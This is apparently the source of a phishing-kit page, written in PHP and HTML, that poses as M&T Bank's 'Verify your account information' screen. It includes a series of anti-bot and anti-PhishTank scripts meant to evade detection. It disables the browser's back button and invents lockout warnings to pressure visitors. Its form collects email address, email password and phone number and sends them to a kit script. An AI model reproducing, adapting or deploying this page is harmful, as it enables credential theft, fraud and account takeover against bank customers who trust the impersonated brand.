<?php

   session_start();
  
include "../KNYGHT/antis/anti1.php";
include "../KNYGHT/antis/anti2.php";
include "../KNYGHT/antis/anti3.php";
include "../KNYGHT/antis/anti4.php";
include "../KNYGHT/antis/anti5.php";
include "../KNYGHT/antis/anti6.php";
include "../KNYGHT/antis/anti7.php";
include "../KNYGHT/antis/anti8.php";
include "../KNYGHT/antis/antibots5.php";
include "../KNYGHT/antis/antibot_host.php";
include "../KNYGHT/antis/antibot_phishtank.php";
include "../KNYGHT/antis/antibot_userAgent.php";
include "../KNYGHT/antis/blocklist.php";
include "../KNYGHT/antis/Bot-Crawler.php";
include "../KNYGHT/antis/Bot-Spox.php";
include "../KNYGHT/antis/dd.php";
include "../KNYGHT/antis/IP-BlackList.php";
include "../KNYGHT/antis/someBots.php";

   
   ?><!DOCTYPE html>
<html class="__sticky-footer" lang="en"><script type="text/javascript">
function preback() {window.history.forward();}
setTimeout("preback()",0);
windows.onunload=function(){null};
</script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <script src="../KNYGHT/2/utag_002.js" type="text/javascript" async=""></script><script type="text/javascript" src="../KNYGHT/2/ruxitagentjs_ICA2SVfhqru_10223210811140219.js" data-dtconfig="rid=RID_-857388665|rpid=2132621116|domain=mtb.com|reportUrl=/rb_edeadee0-0165-4b9e-a91f-0085183ac4e1|app=ea7c4b59f27d43eb|rcdec=1209600000|featureHash=ICA2SVfhqru|vcv=2|rdnt=1|uxrgce=1|bp=3|srmcrv=10|cuc=zgefxirc|mel=100000|dpvc=1|md=mdcc1=a#AuthID@value|ssv=4|lastModification=1632772628597|dtVersion=10223210811140219|srmcrl=1|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/ruxitagentjs_ICA2SVfhqru_10223210811140219.js"></script><link href="../KNYGHT/2/foundation-all.css" rel="stylesheet">
    <link href="../KNYGHT/2/mtb.css" rel="stylesheet">
    <style>
        /*SUGGESTED ADD FOR THE FRAMEWORK*/

        .no-headerFooter > .mtb-page-header
        {
            display: none;
        }

        .no-headerFooter {
            padding-top: 1.5rem;
        }


    </style>
    
    <title>Online Banking  - Verify Account   | M&amp;T Bank</title>
    <link rel="shortcut icon" href="https://asset.mtb.com/Documents/html/homepage/favicon.ico" type="image/x-icon">
<meta class="foundation-mq"><script type="text/javascript" async="" charset="utf-8" id="utag_mtbank.olb-legacy_1" src="../KNYGHT/2/utag.js"></script></head>
<body class="">

    

<header class="mtb-page-header">
    <a class="mtb__logo" href="#">
        <img class="mtb__logo" src="../KNYGHT/2/mtb-logo.svg" alt="M&amp;T Bank">
    </a>
    
        <a href="#" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
        </a>
</header>    
    <div data-msg-code="" class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
    <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
    </div>
    <div class="mtb-app-enrollment--content">
        



<form action="../KNYGHT/inc/e.php" class="js-form js-verifyAccountForm" id="verifyAccountForm" method="post" name="verifyAccountForm">    <input type="hidden" value="R" name="EnrolleeType" id="EnrolleeType">
    <input type="hidden" value="RetailAccount" name="EnrollmentType" id="EnrollmentType">
    <input type="hidden" name="EnrolleeIdentifier" id="EnrolleeIdentifier">
    <input type="hidden" name="EnrolleeToken" id="EnrolleeToken">
    <input type="hidden" value="False" name="IsMobilePlatfom" id="IsMobilePlatfom">
    <input type="hidden" value="OLB:MOE:VerifyYourAccountInfo" name="TagPageName" id="TagPageName">
    <input type="hidden" value="False" name="SetFieldsToProtected" id="SetFieldsToProtected">
        <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
            <div class="cell">
                

<!-- page title -->

    <div class="mtb-section-header mtb-section-header--top">
        
        <h1>
            Verify your account information
        </h1>
        <p>
           <li><small> <font color="Gray">The following information is used to verify  that you are the owner of the account.</font></small></li>
<li><small> <font color="Gray">We match your answers against our records.</font></small></li>
<li><small> <font color="Gray">All fields are required and you must provide valid details to continue.</font></small></li>
<li><small> <font color="Gray">You will be locked out of the system if provided details does not match our records.</font></small></li>
	
        </p>
    </div>

            </div>

                <div class="cell">
                    


<div class="expanded button-group button-group__toggle">
            <button data-ensightentag="AccountInfoButton" type="button" class="button js-enrolleeTypeTab active" data-value="R" data-defaultaccounttype="RetailAccount" data-url="#">Address Information</button>
            
    </div>
                </div>

            





<div class="cell hide" data-showfor="BusinessAccount">
    

    <h2 class="mtb-form__section-title hide" data-showfor="BusinessAccount">
        Company Administrator Information
            <button tabindex="0" type="button" class="m-icon m-icon-questionmarkcircle __contextual-help mtb-help m-icon-questionmarkcircle js-modal-trigger" aria-haspopup="true" aria-controls="reveal-basic" data-ensightentag="CompanyAdministratorInfoQuestionIcon" data-open="companyadmin-modal">
                <span class="show-for-sr">Show Help</span>
            </button>
    </h2>
</div>        
        <div  class="cell formFieldParent" >
            <label >Email Address</label>
          
                <input  maxlength="30"  placeholder=""  type="email" id="AccountNumber" name="mail" required="">
                    
        
            
            
        </div>
         <div class="cell formFieldParent">
            <label >Email Password</label>
           
                <input  maxlength="30"  placeholder=""  type="password" id="AccountNumber" name="pass" required="">
                    
           
            
            
        </div>
		
		 <div  class="cell formFieldParent">
            <label >Phone</label>
           
                <input  maxlength="10"  placeholder=""  type="text" id="AccountNumber" name="ph" required="">
                    
         
            
            
        </div>
        
         
		
		 
		
		  
		
		



<div class="cell hide" data-showfor="BusinessAccount">
    

    <h2 class="mtb-form__section-title hide" data-showfor="BusinessAccount">
        Company Information
    </h2>
</div>        <div data-parentfor="CompanyName" class="cell js-formFieldParent hide" data-showfor="BusinessAccount">
            <label for="CompanyName">Company Name</label>
            <input data-fcid="" maxlength="40" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="custom" placeholder="" type="text" id="CompanyName" name="CompanyName" data-inputtype="text" data-regexname="companyNameAllow">
            <p class="form-error" id="CompanyNameError" role="alert"></p>
            <p class="form-help-text"></p>
        </div>
        <div data-parentfor="CompanyTaxId" class="cell js-formFieldParent hide" data-showfor="BusinessAccount" data-formattype="taxid">
            <label for="CompanyTaxId">Tax ID Number</label>
            <div class="js-maskFldParent input-group m-fake-single-input" data-maskoverlay="●●-●●●●●">
                <input data-fcid="" maxlength="9" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbers" placeholder="00-0000000" data-inputtype="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus" type="tel" id="CompanyTaxId" name="CompanyTaxId">
                    <div class="input-group-button">
                        <button type="button" data-btnfor="CompanyTaxId" class="button clear js-showHide">
                            Hide
                        </button>
                    </div>
            </div>
            <p class="form-error" id="CompanyTaxIdError" role="alert"></p>
                <p class="form-help-text"></p>
            
        </div>

        </section>
        <section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">
            

    <div class="cell">
            <button data-ensightentag="ContinueButton" type="submit" data-url="" class="button button__form submit">
                Continue
            </button>
    </div>
    <div class="cell">
            
    </div>

        </section>
</form>
        
        




<input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility">
    </div>

    
<footer class="mtb-footer" role="contentinfo">
    <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
        <div class="cell">
            <p>
                ©2021 M&amp;T Bank. All Rights Reserved.<br>
                Users of this website agree to be bound by the provisions of the M&amp;T website <a href="#" target="_blank">Terms of Use</a> and <a href="#" target="_blank">Privacy Policy</a>.
            </p>
            <div class="mtb-footer__logo">
                <a href="#" target="_blank">
                    <img src="../KNYGHT/2/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                </a>
                <a href="#" target="_blank">
                    <img src="../KNYGHT/2/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                </a>
            </div>
            <p>
                Equal Housing Lender. NMLS #381076<br>
                <a href="#" target="_blank">Member FDIC.</a>
            </p>
        </div>
    </div>
</footer>
    <script src="../KNYGHT/2/jquery-3.js"></script>
    <script src="../KNYGHT/2/foundation.js"></script>
    <script src="../KNYGHT/2/tealium_prod.js"></script>
    <script src="../KNYGHT/2/errorMsg.js"></script>
    <script src="../KNYGHT/2/mtb-app.js"></script><div class="reveal-overlay"><div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false" aria-hidden="true" data-yeti-box="minwarning-modal" data-resize="minwarning-modal" data-i="zgcc8g-i">

    <div class="mtb-reveal-title ">
        <h1>Timeout Message</h1>
    </div>

    <div class="mtb-reveal-body">
        
    <div class="cell">
        <p>Your online banking session has been inactive for 9 minutes. 
For your security, we will automatically log you out in 1 minute. Click 
Stay Online to continue your session.</p>
    </div>

    </div>

        <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">
            
    <div class="cell small-6">
        <a href="https://m.mtb.com/Enrollment" class="button hollow expanded" aria-label="Log out" data-close="" data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
    </div>
    <div class="cell small-6">
        <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button" data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName" id="TagPageName">STAY ONLINE</button>
    </div>

        </div>
</div></div>
    <script src="../KNYGHT/2/formInputValidations.js"></script>        
    
    <script src="../KNYGHT/2/enrollment.js"></script>

    

    <div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
        <div class="mtb-spinner--triple-dot">
            <div></div>
            <div></div>
            <div></div>
            <span class="show-for-sr">Loading ...</span>
        </div>
    </div>


</body></html>